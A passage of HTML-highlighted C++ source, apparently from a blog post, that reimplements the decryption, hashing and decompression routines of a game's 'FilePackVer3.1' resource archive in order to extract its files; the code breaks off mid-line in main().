class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FilePackVer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x10</span>];</span><br><span class="line">    DWORD filecount;</span><br><span class="line">    <span class="type">int</span> entry_low;</span><br><span class="line">    <span class="type">int</span> entry_high;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">HashData</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x20</span>];</span><br><span class="line">    DWORD HashVerSize;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x100</span>];</span><br><span class="line">    DWORD Unkown;</span><br><span class="line">    <span class="type">char</span> Blank[<span class="number">0x2F8</span>];</span><br><span class="line">    FilePackVer fpacker;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Dencrypt2DataHead</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD sign;</span><br><span class="line">    DWORD isWordType;</span><br><span class="line">    DWORD size;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Dencrypt2DataOutput</span></span><br><span class="line">&#123;</span><br><span class="line">    BYTE* data;</span><br><span class="line">    DWORD len;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FileEntry</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD offset_low;</span><br><span class="line">    DWORD offset_hight;</span><br><span class="line">    DWORD size;</span><br><span class="line">    DWORD dencrypted_size;</span><br><span class="line">    DWORD isCompressed;</span><br><span class="line">    DWORD EncryptType;</span><br><span class="line">    DWORD hash;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">DWORD <span class="title">Tohash</span><span class="params">(<span class="type">void</span>* data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">8</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//准备工作</span></span><br><span class="line">    __m64 mm0 = _mm_cvtsi32_si64(<span class="number">0</span>);</span><br><span class="line">    __m64 mm1;</span><br><span class="line">    __m64 mm2 = _mm_cvtsi32_si64(<span class="number">0</span>);</span><br><span class="line">    DWORD key = <span class="number">0xA35793A7</span>;</span><br><span class="line">    __m64 mm3 = _mm_cvtsi32_si64(key);</span><br><span class="line">     mm3 = _m_punpckldq(mm3, mm3);</span><br><span class="line">     __m64* pdata=(__m64*)data;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; (len &gt;&gt; <span class="number">3</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mm1 = *pdata;</span><br><span class="line">        pdata++;</span><br><span class="line">        mm2 = _m_paddw(mm2, mm3);</span><br><span class="line">        mm1 = _m_pxor(mm1, mm2);</span><br><span class="line">        mm0 = _m_paddw(mm0, mm1);</span><br><span class="line">        mm1 = mm0;</span><br><span class="line">        mm0 = _m_pslldi(mm0, <span class="number">3</span>);</span><br><span class="line">        mm1 = _m_psrldi(mm1, <span class="number">0x1D</span>);</span><br><span class="line">        mm0 = _m_por(mm1, mm0);</span><br><span class="line">    &#125;</span><br><span class="line">    mm1 = _m_psrlqi(mm0, <span class="number">32</span>);</span><br><span class="line">    DWORD result = _mm_cvtsi64_si32(_m_pmaddwd(mm0, mm1));</span><br><span class="line">    _m_empty();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dencrypt</span><span class="params">(<span class="type">void</span>* data,<span class="type">unsigned</span> <span class="type">int</span> len, DWORD hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &gt;&gt; <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    DWORD key1 = <span class="number">0xA73C5F9D</span>;</span><br><span class="line">    DWORD key2 = <span class="number">0xCE24F523</span>;</span><br><span class="line">    DWORD key3 = (len + hash)^ <span class="number">0xFEC9753E</span>;</span><br><span class="line">    __m64 mm7 = _mm_cvtsi32_si64(key1);</span><br><span class="line">    mm7 = _m_punpckldq(mm7, mm7);</span><br><span class="line">    __m64 mm6 = _mm_cvtsi32_si64(key2);</span><br><span class="line">    mm6 = _m_punpckldq(mm6, mm6);</span><br><span class="line">    __m64 mm5 = _mm_cvtsi32_si64(key3);</span><br><span class="line">    mm5 = _m_punpckldq(mm5, mm5);</span><br><span class="line">    __m64* datapos = (__m64*)data;</span><br><span class="line">    __m64 mm0;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len &gt;&gt; <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mm7 = _m_paddd(mm7, mm6);</span><br><span class="line">        mm7 = _m_pxor(mm7, mm5);</span><br><span class="line">        mm0 = *datapos;</span><br><span class="line">        mm0 = _m_pxor(mm0, mm7);</span><br><span class="line">        mm5 = mm0;</span><br><span class="line">        *datapos = mm0;</span><br><span class="line">        datapos++;</span><br><span class="line">    &#125;</span><br><span class="line">    _m_empty();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Dencrypt2DataOutput* <span class="title">dencrypt2</span><span class="params">(<span class="type">void</span>* data, <span class="type">unsigned</span> <span class="type">int</span> len,<span class="type">unsigned</span> <span class="type">int</span> dencrypted_len, DWORD hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> old_table[<span class="number">0x100</span>],new_table[<span class="number">0x100</span>],other[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">        old_table[i] = i;</span><br><span class="line">    Dencrypt2DataHead* head = (Dencrypt2DataHead*)data;</span><br><span class="line">    <span class="keyword">if</span> (head-&gt;sign != <span class="number">0xFF435031</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Errod! 0xFF435031&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (head-&gt;size&gt; <span class="number">0x20000000</span>u)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error! 0x20000000&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    Dencrypt2DataOutput* Output = <span class="keyword">new</span> <span class="built_in">Dencrypt2DataOutput</span>();</span><br><span class="line">    Output-&gt;len = dencrypted_len;</span><br><span class="line">    Output-&gt;data = <span class="keyword">new</span> BYTE[dencrypted_len + <span class="number">1</span>];</span><br><span class="line">    BYTE* outputbuff = Output-&gt;data;</span><br><span class="line">    BYTE* datapos = (BYTE*)data + <span class="built_in">sizeof</span>(Dencrypt2DataHead);</span><br><span class="line">    BYTE* data_start = datapos;</span><br><span class="line">    BYTE* data_end = (BYTE*)data + len;</span><br><span class="line">    BYTE chr;</span><br><span class="line">    <span class="type">int</span> t_pos;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">while</span> (data_start &lt; data_end)</span><br><span class="line">    &#123;</span><br><span class="line">        chr = *data_start;</span><br><span class="line">        datapos = data_start + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(new_table, old_table, <span class="number">0x100</span>);</span><br><span class="line">        t_pos = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (chr &gt; <span class="number">0x7F</span>u)</span><br><span class="line">            &#123;</span><br><span class="line">                t_pos += chr - <span class="number">127</span>;</span><br><span class="line">                chr = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (t_pos &gt; <span class="number">0xFF</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; chr + <span class="number">1</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                new_table[t_pos] = *datapos++;</span><br><span class="line">                <span class="keyword">if</span> (t_pos != (<span class="type">unsigned</span> __int8)new_table[t_pos])</span><br><span class="line">                &#123;</span><br><span class="line">                    other[t_pos] = *datapos++;</span><br><span class="line">                &#125;</span><br><span class="line">                ++t_pos;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (t_pos &gt; <span class="number">0xFF</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            chr = *datapos++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((head-&gt;isWordType &amp; <span class="number">1</span>) == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            size = *(WORD*)datapos;</span><br><span class="line">            data_start = (datapos + <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            size = *(DWORD*)datapos;</span><br><span class="line">            data_start = (datapos + <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        stack&lt;BYTE&gt; stack; <span class="comment">// unsigned char!</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            BYTE result;</span><br><span class="line">            <span class="keyword">if</span> (stack.<span class="built_in">size</span>())</span><br><span class="line">            &#123;</span><br><span class="line">                result = stack.<span class="built_in">top</span>();</span><br><span class="line">                stack.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!size)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                size--;</span><br><span class="line">                result = *data_start;</span><br><span class="line">                data_start++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (result == (BYTE)new_table[result])</span><br><span class="line">            &#123;</span><br><span class="line">                *outputbuff = result;</span><br><span class="line">                outputbuff++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                stack.<span class="built_in">push</span>(other[result]);</span><br><span class="line">                stack.<span class="built_in">push</span>(new_table[result]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Output;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DencryptFileName</span><span class="params">(<span class="type">void</span>* data,<span class="type">int</span> character_count,DWORD hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> key = ((hash &gt;&gt; <span class="number">0x10</span>) &amp; <span class="number">0xFFFF</span>) ^ hash;</span><br><span class="line">    key = character_count ^ <span class="number">0x3E13</span> ^ key ^ (character_count * character_count);</span><br><span class="line">    DWORD ebx = key;</span><br><span class="line">    DWORD ecx;</span><br><span class="line">    WORD* datapos = (WORD*)data;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; character_count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ebx = ebx &lt;&lt; <span class="number">3</span>;</span><br><span class="line">        ecx = (ebx + i + key) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        ebx = ecx;</span><br><span class="line">        *datapos = (*datapos ^ ebx) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        datapos++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD* <span class="title">dencrypt3_hash</span><span class="params">(<span class="type">int</span> hashlen,<span class="type">int</span> datalen,<span class="type">void</span>* filename,<span class="type">int</span> character_count,DWORD Hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD key1 = <span class="number">0x85F532</span>;</span><br><span class="line">    DWORD key2 = <span class="number">0x33F641</span>; </span><br><span class="line">    WORD* character = (WORD*)filename; <span class="comment">// 指向文件名</span></span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> v5 = character_count;</span><br><span class="line">    <span class="type">int</span> v6 = v5;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        key1 = key1 + (*character &lt;&lt; (i &amp; <span class="number">7</span>));</span><br><span class="line">        key2 ^= key1;</span><br><span class="line">        i++;</span><br><span class="line">        v6--;</span><br><span class="line">        character++;</span><br><span class="line">    &#125;<span class="keyword">while</span>(v6);</span><br><span class="line">    DWORD key3 = <span class="number">9</span>*((key2+(Hash^(<span class="number">7</span>*(datalen&amp;<span class="number">0xFFFFFF</span>)+datalen+key1+(key1^datalen^<span class="number">0x8F32DC</span>))))&amp;<span class="number">0xFFFFFF</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    QWORD a3 = key3;</span><br><span class="line">    DWORD* result = <span class="keyword">new</span> DWORD[hashlen];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; hashlen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">a3 = (<span class="number">0x8DF21431</span> * __PAIR64__(a3 ^ <span class="number">0x8DF21431</span>, a3 ^ <span class="number">0x8DF21431</span>)) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">        *(result+i) = a3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dencrypt3</span><span class="params">(<span class="type">void</span>* data,<span class="type">int</span> len, <span class="type">void</span>* filekey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//0x34相当于4字节数据+0xD</span></span><br><span class="line">    DWORD key1 = (*((DWORD*)filekey + <span class="number">0xD</span>) &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    BYTE* datapos = (BYTE*)data, * fkey = (BYTE*)filekey;</span><br><span class="line">    __m64 mm7 = *((__m64*)filekey + <span class="number">0x3</span>); <span class="comment">//这里0x3相当于BYTE的0x18</span></span><br><span class="line">    __m64 mm6, mm0, mm1;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len &gt;&gt;<span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mm6 = *(__m64*)(fkey + key1);</span><br><span class="line">        mm7 = _m_pxor(mm7, mm6);</span><br><span class="line">        mm7 = _m_paddd(mm7, mm6);</span><br><span class="line">        mm0 = *(__m64*)datapos;</span><br><span class="line">        mm0 = _m_pxor(mm0, mm7);</span><br><span class="line">        mm1 = mm0;</span><br><span class="line">        *(__m64*)datapos = mm0;</span><br><span class="line">        mm7 = _m_paddb(mm7, mm1);</span><br><span class="line">        mm7 = _m_pxor(mm7, mm1);</span><br><span class="line">        mm7 = _m_pslldi(mm7, <span class="number">0x1</span>);</span><br><span class="line">        mm7 = _m_paddw(mm7, mm1);</span><br><span class="line">        datapos += <span class="number">8</span>;</span><br><span class="line">        key1 = (key1 + <span class="number">8</span>) &amp; <span class="number">0x7F</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _m_empty();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BYTE* <span class="title">dencypt4_keyfilehash</span><span class="params">(<span class="type">void</span>* data,<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span>* keyfilehash = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span>* keyfilehash_pos = keyfilehash;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">3</span> ==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *keyfilehash_pos = (i + <span class="number">3u</span>) * (i + <span class="number">7u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            *keyfilehash_pos = -(i + <span class="number">3u</span>) * (i + <span class="number">7u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyfilehash_pos++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> key1 = *(BYTE*)((BYTE*)data + <span class="number">0x31</span>);</span><br><span class="line">    key1 = (key1 % <span class="number">0x49</span>) + <span class="number">0x80</span>;</span><br><span class="line">    <span class="type">int</span> key2 = *(BYTE*)((BYTE*)data + <span class="number">0x1E</span> + <span class="number">0x31</span>);</span><br><span class="line">    key2 = (key2 % <span class="number">7</span>) + <span class="number">7</span>;</span><br><span class="line">    BYTE* keyfilehash_pos_byte = (BYTE*)keyfilehash;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key1 = (key1 + key2) % len;</span><br><span class="line">        *keyfilehash_pos_byte ^= *(BYTE*)((BYTE*)data + key1);</span><br><span class="line">        keyfilehash_pos_byte++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (BYTE*)keyfilehash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD* <span class="title">dencrypt4_hash</span><span class="params">(<span class="type">int</span> hashlen, <span class="type">int</span> datalen, <span class="type">void</span>* filename, <span class="type">int</span> character_count, DWORD hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD key1 = <span class="number">0x86F7E2</span>; <span class="comment">//ebx</span></span><br><span class="line">    DWORD key2 = <span class="number">0x4437F1</span>; <span class="comment">//esi</span></span><br><span class="line">    WORD* character = (WORD*)filename;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; character_count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key1 = key1 + (*character &lt;&lt; (i &amp; <span class="number">7</span>));</span><br><span class="line">        key2 ^= key1;</span><br><span class="line">        character++;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD key3 = (datalen ^ key1 ^ <span class="number">0x56E213</span>) + key1 + datalen; <span class="comment">//eax</span></span><br><span class="line">    <span class="type">int</span> key4 = (datalen &amp; <span class="number">0xFFFFFF</span>) * <span class="number">0xD</span>; <span class="comment">//edx</span></span><br><span class="line">    key3 += key4;</span><br><span class="line">    key3 ^= hash;</span><br><span class="line">    key3 = ((key3 + key2) &amp; <span class="number">0xFFFFFF</span>) * <span class="number">0xD</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rax = key3;</span><br><span class="line">    DWORD* result = <span class="keyword">new</span> DWORD[hashlen];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; hashlen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rax = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)(rax ^ <span class="number">0x8A77F473</span>u) * (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x8A77F473</span>u;</span><br><span class="line">        rax = ((rax &amp; <span class="number">0xFFFFFFFF00000000</span>) &gt;&gt; <span class="number">32</span>) + (rax &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">        rax = rax &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        result[i] = rax;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dencrypt4</span><span class="params">(<span class="type">void</span>* data, <span class="type">int</span> len, <span class="type">void</span>* filekey,<span class="type">void</span>* keyfilehash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD key1 = (*((BYTE*)filekey + <span class="number">0x20</span>) &amp; <span class="number">0xD</span>)*<span class="number">8</span>; <span class="comment">// v3 = 8 * (v12 &amp; 0xD); filekey作为esp?  v12:[esp+20h]</span></span><br><span class="line">    BYTE* datapos = (BYTE*)data, * fkey = (BYTE*)filekey,* keyfilekey = (BYTE*)keyfilehash; <span class="comment">// keyfilekey: 另一张hash表</span></span><br><span class="line">    __m64 mm7 = *((__m64*)filekey + <span class="number">0x3</span>); <span class="comment">//这里0x3相当于BYTE的0x18</span></span><br><span class="line">    __m64 mm6, mm0, mm1,mm5;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len &gt;&gt; <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mm6 = *(__m64*)(fkey + ((key1 &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">3</span>));</span><br><span class="line">        mm5 = *(__m64*)(keyfilekey + ((key1 &amp; <span class="number">0x7F</span>) &lt;&lt; <span class="number">3</span>));</span><br><span class="line">        mm6 = _m_pxor(mm6, mm5);</span><br><span class="line">        mm7 = _m_pxor(mm7, mm6);</span><br><span class="line">        mm7 = _m_paddd(mm7, mm6);</span><br><span class="line">        mm0 = *(__m64*)datapos;</span><br><span class="line">        mm0 = _m_pxor(mm0, mm7);</span><br><span class="line">        mm1 = mm0;</span><br><span class="line">        *(__m64*)datapos = mm0;</span><br><span class="line">        mm7 = _m_paddb(mm7, mm1);</span><br><span class="line">        mm7 = _m_pxor(mm7, mm1);</span><br><span class="line">        mm7 = _m_pslldi(mm7, <span class="number">0x1</span>);</span><br><span class="line">        mm7 = _m_paddw(mm7, mm1);</span><br><span class="line">        datapos += <span class="number">8</span>;</span><br><span class="line">        key1 = (key1 + <span class="number">1</span>) &amp; <span class="number">0x7F</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _m_empty();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">FILE* <span class="title">WideChar_CreateFile</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* filename)</span> <span class="comment">// 建文件(包括dir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">wchar_t</span>* pos = (<span class="type">wchar_t</span>*)filename;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pos = <span class="built_in">wcschr</span>(pos, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos == <span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">wchar_t</span>* dir = <span class="keyword">new</span> <span class="type">wchar_t</span>[pos - filename + <span class="number">1</span>]();</span><br><span class="line">        <span class="built_in">wcsncpy</span>(dir, filename, pos - filename);</span><br><span class="line">        _wmkdir(dir);</span><br><span class="line">        pos++;</span><br><span class="line">        <span class="keyword">delete</span> dir;</span><br><span class="line">    &#125;</span><br><span class="line">    FILE* hfile = _wfopen(filename, <span class="string">L&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> hfile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;Please Input The route of datax.pack:\n&quot;</span>;</span><br><span class="line">    string filename;</span><br><span class="line">    cin &gt;&gt; filename;</span><br><span class="line">    FILE* hfile;</span><br><span class="line">    hfile = <span class="built_in">fopen</span>(filename.<span class="built_in">c_str</span>(), <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    _fseeki64(hfile, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">fpos_t</span> file_size = _ftelli64(hfile);</span><br><span class="line">    <span class="comment">//读取filepack头</span></span><br><span class="line">    _fseeki64(hfile, file_size - <span class="number">0x1C</span>, <span class="number">0</span>); <span class="comment">// 读取最后0x1C个字节</span></span><br><span class="line">    FilePackVer* filepacker = <span class="keyword">new</span> <span class="built_in">FilePackVer</span>();</span><br><span class="line">    <span class="built_in">fread</span>(filepacker, <span class="number">0x1C</span>,<span class="number">1</span> , hfile);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">string</span>(filepacker-&gt;sign) != <span class="string">&quot;FilePackVer3.1\x00\x00&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;FilePackVer Error!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//读取HashData</span></span><br><span class="line">    HashData *hashdat = <span class="keyword">new</span> <span class="built_in">HashData</span>();</span><br><span class="line">    _fseeki64(hfile,file_size<span class="number">-0x440</span>,<span class="number">0</span>); <span class="comment">// 利用前面的FilePack结构体减去0x440的offset就是HashData结构体位置</span></span><br><span class="line">    <span class="built_in">fread</span>(hashdat,<span class="number">1</span>,<span class="number">0x440</span>,hfile);</span><br><span class="line">    <span class="comment">//数据的设置</span></span><br><span class="line">    <span class="keyword">if</span> (hashdat-&gt;Unkown &gt; <span class="number">8</span> || hashdat-&gt;Unkown &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        hashdat-&gt;Unkown = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD hash = <span class="built_in">Tohash</span>(&amp;hashdat-&gt;data,<span class="number">0x100</span>) &amp; <span class="number">0x0FFFFFFF</span>;</span><br><span class="line">    <span class="comment">//解码签名</span></span><br><span class="line">    <span class="built_in">dencrypt</span>(&amp;hashdat-&gt;sign, <span class="number">0x20</span>, hash);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(hashdat-&gt;sign,<span class="string">&quot;8hr48uky,8ugi8ewra4g8d5vbf5hb5s6&quot;</span>,<span class="number">0x20</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;HashData Error!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//开始解密文件</span></span><br><span class="line">    DWORD64 entry = ((<span class="type">long</span> <span class="type">long</span>)filepacker-&gt;entry_high &lt;&lt; <span class="number">32</span>) + (<span class="type">long</span> <span class="type">long</span>)filepacker-&gt;entry_low; <span class="comment">// cdq</span></span><br><span class="line">    BYTE* keyfilehash = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; filepacker-&gt;filecount; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        _fseeki64(hfile, entry, <span class="number">0</span>);</span><br><span class="line">        WORD character_count;</span><br><span class="line">        <span class="built_in">fread</span>(&amp;character_count, <span class="number">2</span>, <span class="number">1</span>, hfile);</span><br><span class="line">        <span class="type">wchar_t</span>* name = <span class="keyword">new</span> <span class="type">wchar_t</span>[character_count + <span class="number">1</span>]();</span><br><span class="line">        <span class="comment">//因为UTF16字节数是ASCII的两倍，所以要乘2</span></span><br><span class="line">        <span class="built_in">fread</span>(name, <span class="number">1</span>, <span class="number">2</span> * character_count, hfile);</span><br><span class="line">        <span class="comment">//解密文件名</span></span><br><span class="line">        <span class="built_in">DencryptFileName</span>(name, character_count, hash);</span><br><span class="line">        FileEntry *fentry = <span class="keyword">new</span> <span class="built_in">FileEntry</span>();</span><br><span class="line">        <span class="built_in">fread</span>(fentry, <span class="number">1</span>, <span class="number">0x1C</span>, hfile);</span><br><span class="line">        entry = _ftelli64(hfile);</span><br><span class="line">        <span class="comment">//文件读取</span></span><br><span class="line">        <span class="type">char</span>* filedata = <span class="keyword">new</span> <span class="type">char</span>[fentry-&gt;size];</span><br><span class="line">        _fseeki64(hfile, ((<span class="type">long</span> <span class="type">long</span>)fentry-&gt;offset_hight &lt;&lt; <span class="number">32</span>) + (<span class="type">long</span> <span class="type">long</span>)fentry-&gt;offset_low, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">fread</span>(filedata, fentry-&gt;size, <span class="number">1</span>, hfile);</span><br><span class="line">  </span><br><span class="line">        <span class="comment">//解密文件</span></span><br><span class="line">        DWORD* filehash = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (fentry-&gt;EncryptType == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            filehash = <span class="built_in">dencrypt3_hash</span>(<span class="number">0x40</span>, fentry-&gt;size, name, character_count, hash);</span><br><span class="line">            <span class="built_in">dencrypt3</span>(filedata, fentry-&gt;size, filehash);</span><br><span 